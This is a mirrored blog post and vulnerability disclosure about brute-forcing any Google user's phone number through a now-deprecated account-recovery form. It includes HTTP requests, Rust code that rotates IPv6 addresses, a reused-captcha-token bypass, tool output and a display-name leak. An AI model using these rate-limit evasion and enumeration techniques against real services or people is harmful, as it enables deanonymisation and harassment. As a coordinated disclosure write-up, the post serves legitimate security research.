<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://brutecat.com/articles/leaking-google-phones">Original</a>
    <h1>Bruteforcing the phone number of any Google user</h1>
    
    <div id="readability-page-1" class="page"><article id="post"><a href="https://brutecat.com/" data-svelte-h="svelte-5sfkfb">&lt; Back</a>  <p>2025-06-09</p> <img src="https://brutecat.com/assets/google-phone-disclosure.gif" alt=""/> <!-- HTML_TAG_START --><p>A few months ago, I disabled javascript on my browser while testing if there were any Google services left that still worked without JS in the modern web. Interestingly enough, the username recovery form still worked!</p>
<p>‎</p>


<p>‎</p>

            <h3 id="a-deeper-look-into-the-endpoints">
              A deeper look into the endpoints
            </h3><p>The username recovery form seemed to allow you to check if a recovery email or phone number was associated with a specific display name. This required 2 HTTP requests:</p>
<p>‎</p>
<pre><code><span>POST</span> <span>/signin/usernamerecovery</span> <span>HTTP/2</span>
<span>Host</span><span>: </span>accounts.google.com
<span>Cookie</span><span>: </span>__Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
<span>Content-Length</span><span>: </span>81
<span>Content-Type</span><span>: </span>application/x-www-form-urlencoded
<span>Accept</span><span>: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

<span><span>Email</span>=+<span>18085921029</span>&amp;hl=en&amp;gxf=AFoagUVs61GL09C_ItVbtSsQB4utNqVgKg%<span>3</span>A1747557783359</span></code></pre><blockquote>
<p>The cookie and gxf values are from the initial page HTML</p>
</blockquote>
<p>‎</p>
<p><strong>Response</strong></p>
<pre><code>HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Location: https://accounts.google.com/signin/usernamerecovery/name?ess=..&lt;SNIP&gt;..&amp;hl=en</code></pre><p>This gave us a <code>ess</code> value tied to that phone number we can use for the next HTTP request.</p>
<p>‎</p>
<p><strong>Request</strong></p>
<pre><code>POST /signin/usernamerecovery/lookup HTTP/2
Host: accounts.google.com
Cookie: __Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
Origin: https://accounts.google.com
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i

challengeId=0&amp;challengeType=28&amp;ess=&lt;snip&gt;&amp;bgresponse=js_disabled&amp;GivenName=john&amp;FamilyName=smith</code></pre><p>This request allows us to check if a Google account exists with that phone number as well as the display name <code>&#34;John Smith&#34;</code>. </p>
<p>‎</p>
<p><strong>Response</strong> (no account found)</p>
<pre><code><span>HTTP/2</span> <span>302</span> Found
<span>Content-Type</span><span>: </span>text/html; charset=UTF-8
<span>Location</span><span>: </span>https://accounts.google.com/signin/usernamerecovery/noaccountsfound?ess=...</code></pre><p><strong>Response</strong> (account found)</p>
<pre><code><span>HTTP/2</span> <span>302</span> Found
<span>Content-Type</span><span>: </span>text/html; charset=UTF-8
<span>Location</span><span>: </span>https://accounts.google.com/signin/usernamerecovery/challenge?ess=...</code></pre>
            <h3 id="can-we-even-brute-this-">
              Can we even brute this?
            </h3><p>My first attempts were futile. It seemed to ratelimit your IP address after a few requests and present a captcha.</p>
<p>‎</p>


<p>‎</p>
<p>Perhaps we could use proxies to get around this? If we take Netherlands as an example, the <a href="https://g.co/AccountRecoveryRequest">forgot password flow</a> provides us with the phone hint <code>•• ••••••03</code></p>
<p>‎</p>
<p>For Netherlands mobile numbers, they always start with <code>06</code>, meaning there&#39;s 6 digits we&#39;d have to brute. 10**6 = 1,000,000 numbers. That might be doable with proxies, but there had to be a better way.</p>

            <h3 id="what-about-ipv6-">
              What about IPv6?
            </h3><p>Most service providers like <a href="https://vultr.com">Vultr</a> provide /64 ip ranges, which provide us with 18,446,744,073,709,551,616 addresses. In theory, we could use IPv6 and rotate the IP address we use for every request, bypassing this ratelimit.</p>
<p>‎</p>
<p>The HTTP server also seemed to support IPv6:</p>
<pre><code>~ $ curl -6 https://accounts.google.com
<span>&lt;<span>HTML</span>&gt;</span>
<span>&lt;<span>HEAD</span>&gt;</span>
<span>&lt;<span>TITLE</span>&gt;</span>Moved Temporarily<span>&lt;/<span>TITLE</span>&gt;</span>
<span>&lt;/<span>HEAD</span>&gt;</span>
<span>&lt;<span>BODY</span> <span>BGCOLOR</span>=<span>&#34;#FFFFFF&#34;</span> <span>TEXT</span>=<span>&#34;#000000&#34;</span>&gt;</span>

<span>&lt;<span>H1</span>&gt;</span>Moved Temporarily<span>&lt;/<span>H1</span>&gt;</span>
The document has moved <span>&lt;<span>A</span> <span>HREF</span>=<span>&#34;https://accounts.google.com/ServiceLogin?passive=1209600<span>&amp;amp;</span>continue=https%3A%2F%2Faccounts.google.com%2F<span>&amp;amp;</span>followup=https%3A%2F%2Faccounts.google.com%2F&#34;</span>&gt;</span>here<span>&lt;/<span>A</span>&gt;</span>.
<span>&lt;/<span>BODY</span>&gt;</span>
<span>&lt;/<span>HTML</span>&gt;</span></code></pre><p>To test this out, I routed my IPv6 range through my network interface and I started work on <a href="https://github.com/ddd/gpb">gpb</a>, using <a href="https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html#method.local_address">reqwest&#39;s local_address method</a> on its <code>ClientBuilder</code> to set my IP address to a random IP on my subnet:</p>
<p>‎</p>
<pre><code><span>pub</span> <span>fn</span> <span>get_rand_ipv6</span>(subnet: &amp;<span>str</span>) <span>-&gt;</span> IpAddr {
    <span>let</span> (ipv6, prefix_len) = <span>match</span> subnet.parse::&lt;Ipv6Cidr&gt;() {
        <span>Ok</span>(cidr) =&gt; {
            <span>let</span> <span>ipv6</span> = cidr.<span>first_address</span>();
            <span>let</span> <span>length</span> = cidr.<span>network_length</span>();
            (ipv6, length)
        }
        <span>Err</span>(_) =&gt; {
            <span>panic!</span>(<span>&#34;invalid IPv6 subnet&#34;</span>);
        }
    };

    <span>let</span> <span>ipv6_u128</span>: <span>u128</span> = <span>u128</span>::<span>from</span>(ipv6);
    <span>let</span> <span>rand</span>: <span>u128</span> = <span>random</span>();

    <span>let</span> <span>net_part</span> = (ipv6_u128 &gt;&gt; (<span>128</span> - prefix_len)) &lt;&lt; (<span>128</span> - prefix_len);
    <span>let</span> <span>host_part</span> = (rand &lt;&lt; prefix_len) &gt;&gt; prefix_len;
    <span>let</span> <span>result</span> = net_part | host_part;

    IpAddr::<span>V6</span>(Ipv6Addr::<span>from</span>(result))
}

<span>pub</span> <span>fn</span> <span>create_client</span>(subnet: &amp;<span>str</span>, user_agent: &amp;<span>str</span>) <span>-&gt;</span> Client {
    <span>let</span> <span>ip</span> = <span>get_rand_ipv6</span>(subnet);

    Client::<span>builder</span>()
        .<span>redirect</span>(redirect::Policy::<span>none</span>())
        .<span>danger_accept_invalid_certs</span>(<span>true</span>)
        .<span>user_agent</span>(user_agent)
        .<span>local_address</span>(<span>Some</span>(ip))
        .<span>build</span>().<span>unwrap</span>()
}</code></pre><p>Eventually, I had a PoC running, but I was still getting the captcha? It seemed that for whatever reason, datacenter IP addresses using the JS disabled form were always presented with a captcha, damn!</p>

            <h3 id="using-the-botguard-token-from-the-js-form">
              Using the BotGuard token from the JS form
            </h3><p>I was looking through the 2 requests again, seeing if there was anything I could find to get around this, and <code>bgresponse=js_disabled</code> caught my eye. I remembered that on the <a href="https://accounts.google.com/signin/v2/usernamerecovery">JS-enabled account recovery form</a>, the botguard token was passed via the <strong>bgRequest</strong> parameter.</p>
<p>‎</p>
<p><img src="https://brutecat.com/assets/leaking-google-phones/bgtoken.png"/></p>
<p>‎</p>
<p>What if I replace <code>js_disabled</code> with the botguard token from the JS-enabled form request? I tested it out, and <strong>it worked??</strong>. The botguard token seemed to have no request limit on the No-JS form, but who are all these random people?</p>
<pre><code>$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 -f Henry -l Chancellor -w 3000
Starting with 3000 threads...
HIT: +31612345603
HIT: +31623456703
HIT: +31634567803
HIT: +31645678903
HIT: +31656789003
HIT: +31658854003
HIT: +31667890103
HIT: +31678901203
HIT: +31689012303
HIT: +31690123403
HIT: +31701234503
HIT: +31712345603
HIT: +31723456703</code></pre><p>It took me a bit to realize this, but those were all people who had the Google account name &#34;Henry&#34; with no last name set, as well as a phone with the last 2 digits <strong>03</strong>. For those numbers, it would return <code>usernamerecovery/challenge</code> for the first name Henry and <strong>any last name</strong>.</p>
<p>‎</p>
<p>I added some extra code to validate a possible hit with the first name, and a random last name like <code>0fasfk1AFko1wf</code>. If it still claimed it was a hit, it would be filtered out, and there we go:</p>
<pre><code>$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 --firstname Henry --lastname Chancellor --workers 3000
Starting with 3000 threads...
HIT: +31658854003
Finished.</code></pre><blockquote>
<p>In practise, it&#39;s unlikely to get more than one hit as it&#39;s uncommon for another Google user to have the same full display name, last 2 digits as well as country code. </p>
</blockquote>

            <h3 id="a-few-things-to-sort-out">
              A few things to sort out
            </h3><p>We have a basic PoC working, but there&#39;s still some issues we have to address.</p>
<ul>
<li><a href="#how-do-we-know-which-country-code-a-victim-39-s-phone-is-">How do we know which country code a victim&#39;s phone is?</a></li>
<li><a href="#how-do-we-get-the-victim-39-s-google-account-display-name-">How do we get the victim&#39;s Google account display name?</a></li>
</ul>
<p>‎</p>

            <h4 id="how-do-we-know-which-country-code-a-victim-39-s-phone-is-">
              How do we know which country code a victim&#39;s phone is?
            </h4><p>Interestingly enough, it&#39;s possible for us to figure out the country code based off of the phone mask that the <a href="https://g.co/AccountRecoveryRequest">forgot password flow</a> provides us. Google actually just uses <a href="https://github.com/google/libphonenumber">libphonenumbers</a>&#39;s &#34;national format&#34; for each number.</p>
<p>Here&#39;s some examples:</p>
<pre><code>{
    ...
    &#34;• (•••) •••-••-••&#34;: [
        &#34;ru&#34;
    ],
    &#34;•• ••••••••&#34;: [
        &#34;nl&#34;
    ],
    &#34;••••• ••••••&#34;: [
        &#34;gb&#34;
    ],
    &#34;(•••) •••-••••&#34;: [
        &#34;us&#34;
    ]
}</code></pre><p>I wrote a script that collected the masked national format for all countries as <a href="https://github.com/ddd/gpb/blob/main/data/mask.json">mask.json</a> </p>
<p>‎</p>

            <h4 id="how-do-we-get-the-victim-39-s-google-account-display-name-">
              How do we get the victim&#39;s Google account display name?
            </h4><p>Initially in 2023, Google changed their policy to only show names if there was direct interaction from the target to you (emails, shared docs, etc.), so they slowly removed names from endpoints. By April 2024, they updated their internal <code>FocusBackend</code> service to completely stop returning display names for unauthenticated accounts, removing display names almost everywhere. </p>
<p>‎</p>
<p>It was going to be tricky to find a display name leak after all that, but eventually after looking through random Google products, I found out that I could create a <a href="https://lookerstudio.google.com">Looker Studio</a> document, transfer ownership of it to the victim, and the victim&#39;s display name would leak on the home page, <strong>with 0 interaction required from the victim</strong>:</p>
<p>‎</p>


<p>‎</p>

            <h4 id="optimizing-it-further">
              Optimizing it further
            </h4><p>By using <a href="https://github.com/google/libphonenumber">libphonenumbers</a>&#39;s number validation, I was able to generate a <a href="https://github.com/ddd/gpb/blob/main/data/format.json">format.json</a> with mobile phone prefix, known area codes and digits count for every country.</p>
<pre><code> ...
  <span>&#34;nl&#34;</span><span>:</span> <span>{</span>
        <span>&#34;code&#34;</span><span>:</span> <span>&#34;31&#34;</span><span>,</span>
        <span>&#34;area_codes&#34;</span><span>:</span> <span>[</span><span>&#34;61&#34;</span><span>,</span> <span>&#34;62&#34;</span><span>,</span> <span>&#34;63&#34;</span><span>,</span> <span>&#34;64&#34;</span><span>,</span> <span>&#34;65&#34;</span><span>,</span> <span>&#34;68&#34;</span><span>]</span><span>,</span>
        <span>&#34;digits&#34;</span><span>:</span> <span>[</span><span>7</span><span>]</span>
    <span>}</span><span>,</span>
 ...</code></pre><p>‎</p>
<p>I also implemented <a href="https://github.com/ddd/gpb/blob/main/src/workers/workers.rs#L63">real-time libphonenumber validation</a> to reduce queries to Google&#39;s API for invalid numbers. For the botguard token, I wrote a <a href="https://github.com/ddd/gpb/tree/main/tools/bg_gen">Go script</a> using <a href="https://github.com/chromedp/chromedp">chromedp</a> that lets you generate BotGuard tokens with just a simple API call:</p>
<pre><code>$ curl http://localhost:7912/api/generate_bgtoken
{
  <span>&#34;bgToken&#34;</span>: <span>&#34;&lt;generated_botguard_token&gt;&#34;</span>
}</code></pre>
            <h3 id="putting-it-all-together">
              Putting it all together
            </h3><p>We basically have the full attack chain, we just have to put it together.</p>
<ol>
<li>Leak the Google account display name via Looker Studio</li>
<li>Go through <a href="https://g.co/AccountRecoveryRequest">forgot password flow</a> for that email and get the masked phone</li>
<li>Run the <code>gpb</code> program with the display name and masked phone to bruteforce the phone number</li>
</ol>
<iframe src="https://www.youtube.com/embed/aM3ipLyz4sw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>


            <h3 id="time-required-to-brute-the-number">
              Time required to brute the number
            </h3><p>Using a $0.30/hour server with consumer-grade specs (16 vcpu), I&#39;m able to achieve ~40k checks per second.</p>
<p>With just the last 2 digits from the <a href="https://g.co/AccountRecoveryRequest">Forgot Password flow</a> phone hint:</p>
<table>
<thead>
<tr>
<th>Country code</th>
<th>Time required</th>
</tr>
</thead>
<tbody><tr>
<td>United States (+1)</td>
<td>20 mins</td>
</tr>
<tr>
<td>United Kingdom (+44)</td>
<td>4 mins</td>
</tr>
<tr>
<td>Netherlands (+31)</td>
<td>15 secs</td>
</tr>
<tr>
<td>Singapore (+65)</td>
<td>5 secs</td>
</tr>
</tbody></table>
<p>This time can also be significantly reduced through phone number hints from password reset flows in other services such as PayPal, which provide several more digits (ex. <code>+14•••••1779</code>)</p>

            <h3 id="timeline">
              Timeline
            </h3><ul>
<li>2025-04-14 - Report sent to vendor</li>
<li>2025-04-15 - Vendor triaged report</li>
<li>2025-04-25 - 🎉 <strong>Nice catch!</strong></li>
<li>2025-05-15 - <strong>Panel awards $1,337 + swag.</strong> Rationale: Exploitation likelihood is low. (lol)</li>
<li>2025-05-15 - Appeal reward reason: <a href="https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules#reward-amounts-for-abuse-related-vulnerabilities">As per the Abuse VRP table</a>, probability/exploitability is decided based on pre-requisites required for this attack and whether the victim can discover exploitation. For this attack, there are no pre-requisites and it cannot be discovered by the victim.</li>
<li>2025-05-22 - <strong>Panel awards an additional $3,663.</strong> Rationale: Thanks for your feedback on our initial reward. We took your points into consideration and discussed at some length. We&#39;re happy to share that we&#39;ve upgraded likelihood to medium and adjusted the reward to a total of $5,000 (plus the swag code we&#39;ve already sent). Thanks for the report, and we look forward to your next one.</li>
<li>2025-05-22 - Vendor confirms they have rolled out inflight mitigations while endpoint deprecation rolls out worldwide.</li>
<li>2025-05-22 - Coordinates disclosure with vendor for <em>2025-06-09</em></li>
<li>2025-06-06 - Vendor confirms that the No-JS username recovery form has been fully deprecated</li>
<li>2025-06-09 - Report disclosed</li>
</ul>
<!-- HTML_TAG_END --> <hr/> <p data-svelte-h="svelte-vpfysp">You can contact me via
				<a href="https://signal.me/#eu/oidvqsq7SHvxe38GffjT5yQ83INy6av8eFkW6B06Lu5jeUn4ipVOx5Gf2q5eCkBN"><img src="data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20&#39;-//W3C//DTD%20SVG%201.1//EN&#39;%20&#39;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#39;%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width=&#39;800px&#39;%20height=&#39;800px&#39;%20viewBox=&#39;0%200%2048%2048&#39;%20id=&#39;Layer_2&#39;%20data-name=&#39;Layer%202&#39;%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20fill=&#39;%23ffffff&#39;%20stroke=&#39;%23ffffff&#39;%3e%3cg%20id=&#39;SVGRepo_bgCarrier&#39;%20stroke-width=&#39;0&#39;/%3e%3cg%20id=&#39;SVGRepo_tracerCarrier&#39;%20stroke-linecap=&#39;round&#39;%20stroke-linejoin=&#39;round&#39;/%3e%3cg%20id=&#39;SVGRepo_iconCarrier&#39;%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:none;stroke:%23ffffff;stroke-linejoin:round;}%3c/style%3e%3c/defs%3e%3cpath%20stroke-width=&#39;2px&#39;%20class=&#39;cls-1&#39;%20d=&#39;M27.32,45.25A23.08,23.08,0,0,1,24,45.5a22.26,22.26,0,0,1-3.26-.25m14.44-2.88a21,21,0,0,1-6.08,2.51M41.36,36.7a21.63,21.63,0,0,1-4.66,4.65m5.65-6.16,2.54-6.08a21.25,21.25,0,0,1-2.52,6.07m2.88-14.42A23.33,23.33,0,0,1,45.5,24a22.43,22.43,0,0,1-.25,3.28m-42.46,0A22.46,22.46,0,0,1,2.5,24a22.43,22.43,0,0,1,.25-3.28m39.63-7.89a21.7,21.7,0,0,1,2.51,6.08m-41.69,0a21.19,21.19,0,0,1,2.52-6.06h0m31-6.2a21.19,21.19,0,0,1,4.66,4.65m-34.71,0A21.63,21.63,0,0,1,11.3,6.64M29.09,3.1a21.57,21.57,0,0,1,6.07,2.53h0m-22.33,0a21.07,21.07,0,0,1,6.09-2.51m1.84-.37A21.88,21.88,0,0,1,24,2.5a22.29,22.29,0,0,1,3.27.25&#39;/%3e%3cpath%20stroke-width=&#39;2px&#39;%20class=&#39;cls-1&#39;%20d=&#39;M18.87,44.87a20.92,20.92,0,0,1-5-1.95l-2.24.51&#39;/%3e%3cpath%20stroke-width=&#39;2px&#39;%20class=&#39;cls-1&#39;%20d=&#39;M4.61,36.38l.51-2.2a21.7,21.7,0,0,1-2-5&#39;/%3e%3cpath%20stroke-width=&#39;2px&#39;%20class=&#39;cls-1&#39;%20d=&#39;M10,43.85l-4.08,1a2.19,2.19,0,0,1-2.66-1.56,2.27,2.27,0,0,1,0-1.1l1-4.08&#39;/%3e%3cpath%20stroke-width=&#39;2px&#39;%20class=&#39;cls-1&#39;%20d=&#39;M24,6.41a17.59,17.59,0,0,0-14.83,27l-1.65,7.1,7.16-1.64A17.59,17.59,0,1,0,24,6.41Z&#39;/%3e%3c/g%3e%3c/svg%3e" alt="signal icon"/></a>
				or
				<a href="https://brutecat.com/cdn-cgi/l/email-protection#c2b0adadb682a0b0b7b6a7a1a3b6eca1adaf"><img src="data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20&#39;-//W3C//DTD%20SVG%201.1//EN&#39;%20&#39;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#39;%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width=&#39;800px&#39;%20height=&#39;800px&#39;%20viewBox=&#39;0%200%2024%2024&#39;%20fill=&#39;none&#39;%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%3e%3cg%20id=&#39;SVGRepo_bgCarrier&#39;%20stroke-width=&#39;0&#39;/%3e%3cg%20id=&#39;SVGRepo_tracerCarrier&#39;%20stroke-linecap=&#39;round&#39;%20stroke-linejoin=&#39;round&#39;/%3e%3cg%20id=&#39;SVGRepo_iconCarrier&#39;%3e%3cpath%20d=&#39;M4%207.00005L10.2%2011.65C11.2667%2012.45%2012.7333%2012.45%2013.8%2011.65L20%207&#39;%20stroke=&#39;%23ffffff&#39;%20stroke-width=&#39;1&#39;%20stroke-linecap=&#39;round&#39;%20stroke-linejoin=&#39;round&#39;/%3e%3crect%20x=&#39;3&#39;%20y=&#39;5&#39;%20width=&#39;18&#39;%20height=&#39;14&#39;%20rx=&#39;2&#39;%20stroke=&#39;%23ffffff&#39;%20stroke-width=&#39;1&#39;%20stroke-linecap=&#39;round&#39;/%3e%3c/g%3e%3c/svg%3e" alt="email icon"/></a></p></article></div>
  </body>
</html>
